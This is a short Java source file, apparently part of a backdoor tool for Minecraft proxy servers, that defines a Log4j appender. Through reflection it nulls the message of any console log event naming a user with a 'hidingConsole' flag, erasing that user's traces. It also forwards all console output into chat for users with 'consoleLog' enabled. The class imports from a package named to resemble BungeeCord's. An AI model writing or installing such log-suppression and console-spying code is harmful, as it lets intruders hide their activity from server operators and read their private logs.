package fr.body.ectasy;

import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import java.lang.reflect.Field;
import net.md5.bungee.Ectasy;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.appender.AbstractAppender;

public class LogAppender extends AbstractAppender {
   public void append(LogEvent var1) {
      for(User var3 : Ectasy.users.values()) {
         if (var3.hidingConsole && var1.getMessage().getFormattedMessage().contains(var3.player.getName())) {
            try {
               this.empty(var1, var1.getClass().getDeclaredField("message"));
            } catch (Exception ignored) {
            }
         }

         if (var3.consoleLog) {
            ChatUtil.sendChat(var3.player, "[" + ChatUtil.getColorByPlayer(var3.player) + "Console&f] " + var1.getMessage().getFormattedMessage());
         }
      }
   }

   public void empty(Object var1, Field var2) throws Exception {
      var2.setAccessible(true);
      Field var3 = Field.class.getDeclaredField("modifiers");
      var3.setAccessible(true);
      var3.setInt(var2, var2.getModifiers() & -17);
      var2.set(var1, null);
   }

   public LogAppender() {
      super("LogAppender", null, null);
   }
}
